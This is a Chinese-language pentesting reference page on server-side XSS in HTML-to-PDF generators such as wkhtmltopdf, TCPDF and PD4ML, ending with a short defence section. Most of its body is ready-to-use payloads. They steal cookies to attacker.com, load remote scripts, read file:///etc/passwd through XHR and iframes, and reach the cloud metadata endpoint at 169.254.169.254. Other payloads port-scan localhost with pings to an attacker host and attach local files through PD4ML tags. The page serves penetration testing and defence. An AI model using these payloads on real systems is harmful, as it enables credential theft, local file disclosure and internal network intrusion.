---
attack_surface: [注入类, 配置缺陷]
impact: [信息泄露, 机密性破坏, 权限提升]
risk_level: 严重
prerequisites:
  - XSS 基础（HTML/CSS/JavaScript 注入原理）
  - HTML 渲染引擎 / PDF 生成器概念
  - SSRF 基础（利用链的目标环节）
difficulty: 中级
related_techniques:
  - pdf-injection
  - ssrf
  - xss
---

# Server Side XSS (Dynamic PDF) — 服务端 XSS（动态 PDF 生成器）

> 关联文档：[服务端 XSS 场景详解](服务端%20XSS%20场景详解.md) · [PDF Injection](../PDF%20Injection/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)

---

# 0x01 原理与分类

## 1.1 攻击面总览

当网页用**用户可控输入**动态生成 PDF 时，可以尝试**欺骗执行 PDF 生成的 bot** 执行**任意 JS 代码**：如果 **PDF 生成 bot** 在渲染内容中发现了**HTML 标签**，它会**解释执行**它们，滥用这一行为即可造成**服务端 XSS（Server Side XSS）**——注入的 HTML/JS 不是在用户浏览器、而是在服务端的渲染进程里执行。

> [!WARNING]
> 注意 `<script></script>` 标签**并非总是生效**（取决于渲染引擎），此时需要换一种执行 JS 的方法（例如滥用 `<img>` 事件处理器，见 0x03 SVG 上下文与 0x02 发现载荷中的事件处理器变体）。

可见性与盲打的分流（详见 2.1）：常规利用中你通常**能查看/下载生成的 PDF**，因此能通过 JS **看到一切写入产物**的内容（如 `document.write()` 的输出）。但**看不到生成的 PDF** 时，就需要**向你的服务器发起 Web 请求来外带信息**（Blind）。

> 边界说明：本文档覆盖"服务端把用户输入渲染进 PDF"的攻击面；针对"恶意构造的 PDF 文件本身"（解析侧攻击）属于 [PDF Injection](../PDF%20Injection/README.md) 专题，两者不在同一攻击链位置。

## 1.2 常见 PDF 生成引擎

| 引擎 | 生态 | 特性 |
|---|---|---|
| **wkhtmltopdf** | 命令行 | 基于 **WebKit** 渲染引擎将 HTML/CSS 转为 PDF，开源、部署广泛 |
| **TCPDF** | PHP | 图片/图形/加密支持完备；渲染时会经 cURL/`getimagesize()`/`file_get_contents()` 自动抓取 HTML 中的 URL（见下） |
| **PDFKit** | Node.js | 从 HTML/CSS 生成 PDF |
| **iText** | Java | 支持数字签名、表单填充等高级特性 |
| **FPDF** | PHP | 轻量简单，无大量附加功能 |

**引擎差异决定攻击可行性**（源材料未系统化，以下差异点由 [SSRF 专题](../../User%20input/Reflected%20Values/SSRF/README.md) 所整理的 hacktricks 交叉引用页 "HTML-to-PDF renderers as blind SSRF gadgets" 补充）：

- HTML 解释程度与 `<script>` 支持性各引擎不一——WKHTML/WebKit 类完整支持 DOM+JS；TCPDF 类主要按 HTML 标签抓取资源而**不一定执行 JS**。
- TCPDF 6.10.0（及 spipu/html2pdf 包装）对每个 `<img>` 资源发起**多次抓取尝试**，单个 payload 可产生多个请求（利于时序型端口扫描）；html2pdf 的 `Css::extractStyle()` 只做浅层 scheme 检查后直接 `file_get_contents($href)`，可借此探测回环服务、RFC1918 网段与云 metadata。
- 凡是渲染时自动抓取 URL 的引擎，**即便不执行 JS 也可充当盲 SSRF 代理**（防御视角见 0x0A）。

## 1.3 相关攻击场景家族

动态 PDF 只是"服务端渲染器消费用户 HTML"的一个实例。同族场景——无头浏览器截图/预览、SEO Bot、社交卡片、SSR 产物二次消费、Email HTML 渲染、报告生成服务——共享同一判定模型（引擎是否执行 JS / 产物是否回显 / 渲染器网络位置），逐场景展开见配套章节 [服务端 XSS 场景详解](服务端%20XSS%20场景详解.md)，本文档 payload 可直接平移适用。

# 0x02 检测 / 前置条件

## 2.1 可见性分流（盲 vs 非盲）

先判断产物是否回到你手里：**能下载/看到生成的 PDF** → 用 `document.write()` 类写入直接把结果画进 PDF 产物读取；**看不到产物** → 全部改走**外带通道**（向自己服务器发请求），并优先使用 2.2 中的盲发现载荷。

## 2.2 发现载荷（Discovery）

```html
<!-- Basic discovery, Write something-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">

<!-- Using base HTML tag -->
<base href="http://attacker.com" />

<!-- Loading external stylesheet -->
<link rel="stylesheet" src="http://attacker.com" />

<!-- Meta-tag to auto-refresh page -->
<meta http-equiv="refresh" content="0; url=http://attacker.com/" />

<!-- Loading external components -->
<input type="image" src="http://attacker.com" />
<video src="http://attacker.com" />
<audio src="http://attacker.com" />
<audio><source src="http://attacker.com"/></audio>
<svg src="http://attacker.com" />
```

注：`<script src>` 类载荷本身就是出站请求，与事件处理器载荷（`onerror` 等）分开测试可避免把"资源被预抓取"误判为"JS 已执行"。

JS 执行确认可用 **DOM 操作**而非仅 `document.write`（noob.ninja 案例）：渲染进产物后看到写入的内容即确认执行。

```html
<p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script>
```

**实战条件与限制**（源自 buer.haus 的 PhantomJS 图像渲染案例）：

- `<script>` 不生效、`onerror` 触发不稳定（案例中约 1/100），根因是**渲染竞态**——引擎截图时未等 JS 加载完成；用 `document.write()` 完全覆写页面内容可将 JS 执行稳定到每次触发。
- 渲染进程可用 UA 指纹识别（案例为 `PhantomJS/2.1.1`），用于确认引擎选型与载荷取舍。
- 页面若以 file:// 上下文打开（确认方法见 2.3），读取本地文件优先于 SSRF（见 5.1 的上下文条件）。

## 2.3 路径泄露（Path disclosure）

```html
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```

## 2.4 Bot 存活检测（Bot delay）

```html
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
    let time = 500;
    setInterval(()=>{
        let img = document.createElement("img");
        img.src = `https://attacker.com/ping?time=${time}ms`;
        time += 500;
    }, 500);
</script>
<img src="https://attacker.com/delay">
```

# 0x03 SVG 执行上下文

当 `<script>` 不生效时，SVG 提供替代执行上下文。下列各 payload 可以放进 SVG 中复用；示例含一个访问 Burp Collaborator 子域的 iframe 和一个访问云 metadata 端点的 iframe：

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      alert(1);
   // ]]>
  </script>
</svg>
```

更多 SVG payload 见 [svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)。

# 0x04 外部脚本加载

最省事的利用方式是让 bot 加载**你本地控制的脚本**——payload 只写一次，之后可随时改脚本内容、bot 每次都用同一段注入代码加载最新版本：

```html
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```

# 0x05 本地文件读取与 SSRF

## 5.1 XHR 读取 file://

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```html
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
</script>
```

> [!NOTE]
> 上下文条件：渲染器以 **file:// 上下文**打开页面时（noob.ninja 案例），iframe 加载内网与外部 http 域名均不可达，但 XHR 读取 file:// 正常；SSRF 是否可行取决于页面是 file:// 还是 http(s) 上下文（后者见 5.3）。先用 2.3 的路径泄露确认 `window.location`，再选择利用方向。
> 另可结合 [File Inclusion-Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) 中的 HTML-to-PDF 图片/SVG 路径穿越技巧，将本地文件间接渲染进产物。

## 5.2 标签型文件读取载体

```html
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

另有一类引擎级 annotation/attachment 标签（是否支持取决于引擎，PD4ML 见 0x07）：

```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

## 5.3 转为 SSRF（含云 metadata）

> [!WARNING]
> 把 `file:///etc/passwd` 换成例如 `http://169.254.169.254/latest/user-data` 即可**尝试访问外部网页（SSRF）**。结合 [SSRF 专题](../../User%20input/Reflected%20Values/SSRF/README.md) 的云 metadata 手法与云环境感知（见其 Cloud SSRF 内容），可利用渲染器位置直取实例凭据。

这一漏洞可**非常轻易地转化为 SSRF**（因为你可以让脚本加载外部资源）——拿到 JS 执行后直接读取云 metadata 或内网即可。

## 5.4 SSRF 绕过参考

SSRF 被限制域名/IP 时，知识库 [SSRF 专题的 URL Format Bypass](../../User%20input/Reflected%20Values/SSRF/URL%20Format%20Bypass.md) 收录了完整绕过形态（localhost 各种编码表示、域解析混淆、redirect 302 绕过、DNS rebinding 等），此处不重复展开。

# 0x06 端口扫描

配合 Bot delay 类的存活确认，可对本机端口做盲扫——`no-cors` fetch 使请求必然成功送达，命中端口即触发外带 ping：

```html
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
        let img = document.createElement("img");
        img.src = `http://attacker.com/ping?port=${port}`;
    });
}

for(let i=0; i<1000; i++) {
    checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```

# 0x07 附件型引擎：PD4ML

部分 HTML→PDF 引擎允许**为 PDF 指定附件**（如 **PD4ML**），可滥用该特性**把任意本地文件挂进 PDF**。取回附件的方式：用 **Firefox 打开 PDF 并双击回形针图标**将附件另存为新文件；用 Burp 抓取 **PDF 响应**也可在**明文**中看到附件内容。

```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html>
  <pd4ml:attachment
    src="/etc/passwd"
    description="attachment sample"
    icon="Paperclip" />
</html>
```

# 0x0A 防御与缓解

## A.1 输入与模板侧

- 用户输入禁止原样进入 HTML/URL 上下文：进入模板前统一 HTML 转义；必须接受 URL 时走协议/主机白名单（可被编码绕过，见 SSRF 专题 URL Format Bypass）。
- 富文本字段先 sanitize 再入库——存储型输入会在报告/导出时被渲染器二次放大。

## A.2 渲染器运行侧

- **渲染前剥离外部 URL，或将渲染器隔离在无出站流量的网络沙箱中**——在此之前，把 PDF 生成器当作盲 SSRF 代理对待（源材料硬化建议）。
- 渲染进程最小权限：禁止 file:// 与本地资源访问（若引擎支持配置）、禁读云 metadata、headless 进程运行于专用低权限账户。
- 产物渲染与业务网络隔离，防本机端口扫描面扩大。

## A.3 检测

- 渲染器出站请求日志与告警（OAST 探测、外连 ping 特征）；异常多的逐端口请求（端口扫描载荷）应触发告警。
- 对可下载的 PDF/报告产物抽查渲染内容，审计模板注入点（标题/用户名/文件名等数据字段）。

## 参考资料

- [hacktricks — Server Side XSS (Dynamic PDF)](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)
- [buer.haus — Escalating XSS in PhantomJS Image Rendering to SSRF/Local File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
- [noob.ninja — Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [lbherrera — h1415 CTF Writeup](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
- [infosecwriteups — Breaking Down SSRF on PDF Generation: A Pentesting Guide](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)
- [Intigriti — Exploiting PDF Generators: A Complete Guide to Finding SSRF Vulnerabilities in PDF Generators](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators)
